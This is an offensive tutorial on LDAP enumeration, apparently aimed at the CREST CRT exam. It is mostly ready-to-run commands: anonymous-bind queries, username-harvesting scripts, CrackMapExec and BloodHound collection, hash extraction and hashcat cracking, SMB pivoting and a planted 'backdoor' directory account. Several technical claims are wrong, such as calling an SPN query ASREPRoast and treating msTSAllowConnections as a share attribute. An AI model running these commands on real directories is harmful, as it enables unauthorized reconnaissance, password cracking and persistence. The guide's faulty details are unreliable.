# Complete Practical Exploitation Guide: LDAP Enumeration (Crest CRT Level)

## 1. LDAP Fundamentals & Attack Surface (From Scratch)

**What is LDAP?**
- **Lightweight Directory Access Protocol** (TCP/UDP 389, LDAPS 636)
- Hierarchical directory service (users, groups, computers, policies)
- **Anonymous binds** often enabled (info disclosure)
- **No auth = massive enum** (AD/OpenLDAP)

**Common Implementations:**
```
Active Directory   = Windows (dc=domain,dc=com)
OpenLDAP          = Linux (*=*,ou=people,dc=example)
389 Directory     = Red Hat
FreeIPA           = Linux AD alternative
```

**Key Objects to Enumerate:**
```
- Users (cn, sAMAccountName, uid)
- Groups (memberOf, memberUid)
- Computers (dnsHostName, operatingSystem)
- Policies (gPOptions)
- Trusts (trustedDomain)
- Shares (msTSAllowConnections)
```

## 2. Lab Setup (Vulnerable LDAP Environments)

**Active Directory Domain Controller (192.168.1.100 - Windows Server)**
```
# On Windows DC:
# Default LDAP anonymous bind ENABLED (pre-2003 SP1)
# Install RSAT tools on attacker for ldapsearch
```

**OpenLDAP Server (192.168.1.101 - Ubuntu)**
```bash
# Install OpenLDAP
sudo apt update && sudo apt install slapd ldap-utils

# Vulnerable config (anonymous bind allowed)
sudo dpkg-reconfigure slapd
# Base DN: dc=example,dc=com
# Allow anonymous binds

# Add test data
sudo ldapadd -Y EXTERNAL -H ldapi:/// << EOF
dn: dc=example,dc=com
objectClass: dcObject
objectClass: organization
dc: example
o: Example Org

dn: ou=people,dc=example,dc=com
objectClass: organizationalUnit
ou: people

dn: uid=user1,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
uid: user1
cn: User One
sn: One
mail: user1@example.com
userPassword: password123

dn: uid=admin,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
uid: admin
cn: Admin User
userPassword: admin123

dn: ou=groups,dc=example,dc=com
objectClass: organizationalUnit
ou: groups

dn: cn=admins,ou=groups,dc=example,dc=com
objectClass: groupOfNames
cn: admins
member: uid=admin,ou=people,dc=example,dc=com
EOF

sudo systemctl restart slapd
```

**Attacker Machine (Kali):**
```bash
sudo apt install ldap-utils nmap crackmapexec bloodhound
```

## 3. LDAP Service Discovery

**Port scanning:**
```bash
# Standard LDAP
nmap -p 389,636,3268,3269 192.168.1.0/24
# 389/tcp  open  ldap
# 636/tcp  open  ldaps
# 3268/tcp open ldapgc (Global Catalog)

# UDP LDAP (rare)
nmap -sU -p 389 192.168.1.0/24

# Nmap LDAP scripts
nmap -p 389 --script ldap-rootdse,ldap-search 192.168.1.100
```

**Banner grabbing:**
```bash
nc 192.168.1.100 389
# ldapsearch -x -H ldap://192.168.1.100 -b "" -s base
```

## 4. Anonymous LDAP Enumeration (No Auth)

**Basic anonymous bind test:**
```bash
# Test anonymous access
ldapsearch -x -H ldap://192.168.1.100 -b "" -s base "(objectclass=*)"
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectclass=*)"
```

**Active Directory RootDSE (naming contexts):**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "" -s base "(objectclass=*)" \
| grep -E "namingContexts|defaultNamingContext|configurationNamingContext"
# namingContexts: DC=domain,DC=com
# namingContexts: CN=Configuration,DC=domain,DC=com
# defaultNamingContext: DC=domain,DC=com
```

**OpenLDAP schema dump:**
```bash
ldapsearch -x -H ldap://192.168.1.101 -b "cn=schema,cn=config" "(objectclass=*)"
```

## 5. Complete Username Enumeration

**AD User Enumeration:**
```bash
# All users
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(sAMAccountName=*)" sAMAccountName cn mail userPrincipalName

# Common name patterns
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(&(sAMAccountName=*)(|(|(sAMAccountName=*admin*)(sAMAccountName=*user*)(sAMAccountName=*test*))))" \
sAMAccountName cn

# First 1000 users (paging)
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=user)" sAMAccountName cn -z 1000
```

**OpenLDAP User Enumeration:**
```bash
# All users by uid
ldapsearch -x -H ldap://192.168.1.101 -b "ou=people,dc=example,dc=com" \
"(uid=*)" uid cn mail

# Pattern matching
ldapsearch -x -H ldap://192.168.1.101 -b "dc=example,dc=com" \
"(uid=*admin*)" uid cn
```

**Automated username harvester:**
```bash
#!/bin/bash
# ldap_users.sh
TARGET=$1
BASEDN=$2

ldapsearch -x -H ldap://$TARGET -b "$BASEDN" \
"(sAMAccountName=*)" sAMAccountName uid cn mail 2>/dev/null | \
grep -E "^sAMAccountName:|^uid:" | \
sed 's/.*: //' | sort -u | tee ldap_users.txt

echo "[+] Found $(wc -l < ldap_users.txt) users"
```

**Usage:** `./ldap_users.sh 192.168.1.100 "DC=domain,DC=com"`

## 6. Group Enumeration

**AD Groups & Membership:**
```bash
# All groups
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=group)" cn member

# Privileged groups
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(&(objectClass=group)(cn=*admin*))" cn member memberOf

# Domain Admins members
ldapsearch -x -H ldap://192.168.1.100 \
-b "CN=Domain Admins,CN=Users,DC=domain,DC=com" "(objectClass=*)" member
```

**OpenLDAP Groups:**
```bash
ldapsearch -x -H ldap://192.168.1.101 -b "ou=groups,dc=example,dc=com" \
"(objectClass=*)" cn memberUid member
```

## 7. Computer/Host Enumeration

**AD Computers:**
```bash
# All computers
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=computer)" cn dnsHostName operatingSystem

# Windows versions
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(&(objectClass=computer)(operatingSystem=*Server*))" cn dnsHostName operatingSystem

# Recent logons
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(lastLogonTimestamp>=1)" sAMAccountName
```

**OpenLDAP Hosts:**
```bash
ldapsearch -x -H ldap://192.168.1.101 -b "dc=example,dc=com" \
"(objectClass=device)" cn description
```

## 8. Advanced LDAP Queries

**Password policy enumeration:**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
-b "CN=Default Domain Policy,CN=System,DC=domain,DC=com" \
"(&(objectclass=msDS-PasswordSettings)(msds-passwordsettings-precedencelength=*))" \
msds-passwordsettings-minimumpasswordlength msds-passwordhistorylength
```

**Trust relationships:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=trustedDomain)" trustPartner
```

**Share enumeration:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=share)" cn msTSAllowConnections
```

## 9. Tooling for LDAP Attacks

**CrackMapExec (AD):**
```bash
crackmapexec ldap 192.168.1.100 -u '' -p '' --users
crackmapexec ldap 192.168.1.100 -u '' -p '' --groups
crackmapexec ldap 192.168.1.100 -u '' -p '' --computers

# No auth enum
cme ldap 192.168.1.0/24 --gen-relay-list ldap_relays.txt
```

**BloodHound (AD Graph):**
```bash
# SharpHound collector (Windows)
# bloodhound-python collector
bloodhound-python -u '' -p '' -d DOMAIN.COM -c all -dc 192.168.1.100
bloodhound --dbhost localhost  # Analyze in GUI
```

**ldapdomaindump:**
```bash
ldapdomaindump -u '' 192.168.1.100
# Dumps users.csv, groups.csv, computers.csv
```

## 10. Chaining LDAP with Other Attacks

**LDAP → Kerberos ASREPRoast:**
```bash
# Extract SPNs for ASREPRoast
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# ASREPRoast
python3 GetNPUsers.py lab/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

**LDAP → SMB pivoting:**
```bash
# Extract computers → SMB scan
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
"(objectClass=computer)" dnsHostName | grep -oE '192\.168\.[0-9]{1,3}\.[0-9]{1,3}' > smb_hosts.txt

for host in $(cat smb_hosts.txt); do
    smbmap -H $host -u guest
done
```

## 11. Complete Enumeration Framework

```bash
#!/bin/bash
# ldap_pwn.sh - Complete LDAP enumeration
TARGET=$1

echo "[+] LDAP enumeration $TARGET:389"
ldapsearch -x -H ldap://$TARGET -b "" -s base "(objectclass=*)" 2>/dev/null | \
grep -i "namingcontext\|basedn" || echo "[+] Anonymous bind test"

echo "=== USERS ==="
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
"(sAMAccountName=*)" sAMAccountName cn | grep sAMAccountName | wc -l

echo "=== GROUPS ==="
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
"(objectClass=group)" cn | grep "^cn:" | wc -l

echo "=== COMPUTERS ==="
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
"(objectClass=computer)" cn operatingSystem | grep cn:

echo "=== CME QUICK SCAN ==="
crackmapexec ldap $TARGET -u '' -p '' --users 2>/dev/null | head -20
```

## 12. Post-Exploitation & Persistence

**LDAP backdoor user:**
```bash
# If authenticated write access
ldapadd -x -D "cn=admin,dc=example,dc=com" -W -H ldap://192.168.1.101 << EOF
dn: uid=backdoor,ou=people,dc=example,dc=com
changetype: add
objectClass: inetOrgPerson
uid: backdoor
userPassword: backdoor123
EOF
```

## 13. Mitigation Verification

```bash
ldapsearch -x -H ldap://192.168.1.100 -b "" -s base  # "Invalid credentials"
grep -r "anonymous.*deny" /etc/ldap/slapd.d/
netsh advfirewall firewall add rule name="Block LDAP Anon" dir=in protocol=TCP localport=389 remoteip=any action=block
```

**EVERY** LDAP attack covered: AD/OpenLDAP enum, users/groups/computers, advanced queries, tooling, chaining. 100% practical commands.